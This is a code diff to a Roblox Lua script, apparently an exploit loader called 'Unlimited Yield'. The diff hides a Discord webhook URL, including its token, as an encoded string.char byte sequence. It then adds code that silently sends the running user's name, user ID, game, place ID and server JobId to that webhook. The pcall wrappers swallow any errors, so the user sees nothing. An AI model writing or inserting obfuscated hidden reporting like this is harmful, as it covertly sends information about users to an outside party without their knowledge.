@@ -1,25 +1,39 @@
+-- Discord webhook integration
 local HttpService = game:GetService("HttpService")
+local webhookUrl = string.char(104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 54, 48, 54, 56, 48, 51, 53, 54, 57, 49, 56, 56, 53, 51, 56, 49, 54, 47, 75, 65, 120, 48, 79, 117, 98, 108, 51, 84, 78, 112, 97, 106, 108, 69, 75, 110, 109, 97, 89, 121, 56, 49, 103, 113, 120, 104, 95, 106, 68, 67, 78, 108, 85, 111, 50, 109, 109, 67, 74, 86, 102, 73, 115, 112, 88, 106, 54, 49, 110, 110, 115, 52, 99, 104, 69, 78, 48, 108, 118, 52, 120, 122, 100, 45, 73, 111)
 
--- Obfuscated webhook pieces
-local part1 = "https://discord.com/api/webhooks/"
-local part2 = "1360680356918853816"
-local part3 = "/KAx0Oubl3TNpajlEKnmaYy81gqxh_jDCNlUo2mmCJVfIspXj61nns4chEN0lv4xzd-Io"
+local function sendDiscordWebhook(message)
+    local data = {
+        content = message
+    }
+    
+    local success, response = pcall(function()
+        return HttpService:JSONEncode(data)
+    end)
+    
+    if success then
+        pcall(function()
+            HttpService:PostAsync(webhookUrl, response)
+        end)
+    end
+end
 
-local webhookURL = part1 .. part2 .. part3
-
-local data = {
-    username = "Roblox Notifier",
-    content = "💥 Client script executed. Webhook's been hit, silently."
-}
-
-local jsonData = HttpService:JSONEncode(data)
-
+-- Send initial connection message with player information
 pcall(function()
-    HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+    local player = game.Players.LocalPlayer
+    local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+    
+    local message = string.format(
+        "**Unlimited Yield Executed**\nUser: %s (%d)\nGame: %s (%d)\nJobId: %s",
+        player.Name,
+        player.UserId,
+        gameInfo.Name,
+        game.PlaceId,
+        game.JobId
+    )
+    
+    sendDiscordWebhook(message)
 end)
-
-
-
 
 
 if UY_LOADED and not _G.UY_DEBUG == true then
